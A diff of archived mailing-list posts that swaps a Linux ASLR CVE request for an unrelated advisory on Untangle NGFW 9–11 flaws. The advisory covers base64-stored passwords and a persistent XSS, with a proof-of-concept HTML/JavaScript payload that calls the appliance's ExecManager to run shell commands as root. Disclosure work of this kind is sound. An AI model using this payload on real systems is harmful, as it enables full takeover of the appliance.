@@ -1,39 +1,59 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2015/03/03/6
-Message-ID: <54F5CA9A.6020504@upv.es>
-Date: Tue, 03 Mar 2015 15:52:10 +0100
-From: Hector Marco <hecmargi@....es>
-To: cve-assign@...re.org, oss-security@...ts.openwall.com
-Subject: Re: CVE-Request: Linux ASLR mmap weakness: Reducing entropy by half
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2015/03/08/3
+Message-ID: <DUB125-W461C653F7E7A2097966E1AD51A0@phx.gbl>
+Date: Sun, 8 Mar 2015 21:32:52 +0000
+From: Hutton <c.e.hutton@...mail.com>
+To: "fulldisclosure@...lists.org" <fulldisclosure@...lists.org>
+CC: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
+Subject: Multiple vulnerabilities in Untangle NGFW 9-11
 Content-Type: text/plain; charset=utf-8
 
-Hello Mitre,
+Multiple issues have been discovered in the Untangle NGFW virtual 
+appliance. The vendor was unresponsive and uncooperative to the researcher.
 
-Any update about this issue ?
+- Persistent XSS leading to root
+Authentication requiredConfirmed in versions 9 and 11 (up to rev r39357)
+Throughout
+ the Untangle user interface there are editable data tables for various 
+user configuration options. An example of this is in: Configuration >
+ Networking > Port Forwards. This table can be edited by clicking add
+ to create a new port forward rule, or directly edited by 
+double-clicking on the table rows themselves.
+The
+ problem arises from malicious user input into some of the fields of 
+these editable tables, which is not properly sanitised and allows for 
+execution of user supplied Javascript code in the context of the users 
+browser. Because this configuration data is saved into the backend 
+database, this allows for Persistent XSS in each of the vulnerable 
+fields/tables.
+This XSS attack is particularly 
+devastating due to the fact that the malicious attacker can run commands
+ as root on the virtual appliance, allowing for total system takeover. 
+This is because the Untangle JSON-RPC API has access to functionality 
+provided by the ExecManager class 
+(https://gitorious.org/untangle/src/source/381ad9cb2d1d475bb43814b07bbb0df2d1ae7b58:uvm/api/com/untangle/uvm/ExecManager.java),
+ which by default allows for arbitrary commands to be run as root on the
+ system.
+A POC demonstrating the issue is below:
+Insert
+ the following into the srcdoc attribute of a user-controlled iframe in 
+the Description field or another vulnerable field (can also be styled to
+ hide etc):
+Test <iframe srcdoc='[insert code]'></iframe> (single quotes)
+Insert:
+<html><head>        <script type="text/javascript" src="/ext4/ext-all-debug.js"></script>        <script type="text/javascript" src="/jsonrpc/jsonrpc.js"></script>        <script type="text/javascript" src="/script/i18n.js"></script>        <script type="text/javascript" src="script/components.js"></script>        <script type="text/javascript" src="script/main.js"></script></head><body onload="exec()"><script type="text/javascript">        function exec() {                var rpc = {};                rpc.jsonrpc = new JSONRpcClient("/webui/JSON-RPC");                var serverUID = rpc.jsonrpc.UvmContext.getServerUID();                alert(serverUID);                rpc.execManager = rpc.jsonrpc.UvmContext.execManager();                var cmd = "whoami > /tmp/who";                var exit = rpc.execManager.execResult(cmd);                alert("Command: " + cmd + " - Exit code: " + exit);        }</script></body></html>
+- Information disclosure from Local Directory
+Authentication requiredConfirmed in versions 9 and 11, not fixed.
+The
+ Local Directory interface shows a list of users stored on the Untangle 
+system. Unfortunately, passwords are not sufficiently encrypted to 
+prevent information disclosure.
+Each user in 
+the local directory interface has an attribute, 'passwordBase64Hash', 
+which is the base64 encoded string of the plaintext password. Because 
+base64 is a bi-directional encoding scheme, the passwordBase64Hash 
+attribute can be trivially decoded into the original plaintext string, 
+revealing the password for each user.
 
-
-
-El 18/02/15 a las 12:01, Hector Marco escribió:
-> Hi,
->
-> A bug in Linux ASLR implementation for versions prior to 3.19 has been found.
-> The issue is that the mmap area for processes is not properly randomized on some
-> architectures.
->
-> Affected systems have reduced the mmap base area entropy of the processes by half.
->
->
-> Details at:
-> http://hmarco.org/bugs/linux-ASLR-reducing-mmap-by-half.html
->
->
->
-> Could you please assign a CVE-ID for this?
->
->
->
-> Hector Marco.
-> http://hmarco.org
->
-> Cyber-security researcher at
-> http://cybersecurity.upv.es/
+CH
+ 		 	   		  
